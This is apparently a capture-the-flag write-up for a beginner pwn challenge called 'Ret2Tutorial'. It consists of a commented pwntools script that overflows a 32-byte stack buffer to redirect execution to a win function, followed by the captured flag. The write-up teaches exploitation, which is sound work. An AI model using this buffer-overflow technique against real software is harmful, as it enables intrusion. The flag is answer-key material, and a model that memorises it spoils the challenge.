# Ret2Tutorial

Baby's first pwn challenge!

## Hints

## Solution

```
from pwn import *

io = remote("127.0.0.1", 443, ssl=True, sni="ret2tutorial")
# io = process("./ret2tutorial") # for running locally

# Irrelevant for the solve, just solving the questions and checking if messages are received
io.sendlineafter(b"Is this your first time doing a pwn challenge? Y/N:", b'N')
text = io.recvline()
print("text1", text)
text2 = io.recvline()
print("text2", text2)
text3 = io.recvline()
print("text3", text3)

# Looking at the source code we can see Message buffer is 32 bytes but an unlimited amount of bytes is allowed to be input
# We Will need to fill enough bytes in the stack to overwrite RIP, which is the address that execution goes to whenever the 
# `ret` instruction is called at the end of a function.

# Another option is to use cyclic to determine when the program segfaults but here you are given source

# Use b"" here to indicate that A is a byte and not a string
payload = b"A" * 40  

# The address to the win function can be found by loading the binary in gdb and doing info functions, we write 32 bytes for the buffer
# Then an additional 8 bytes for writing past rbp, then at that point we'll be writing into rip.

win_addr = 0x4012df 
payload += p64(win_addr) 
io.sendline(payload)
io.interactive()
```

flag:
`gigem{b3g1n_pwn1ng_n00bs}`
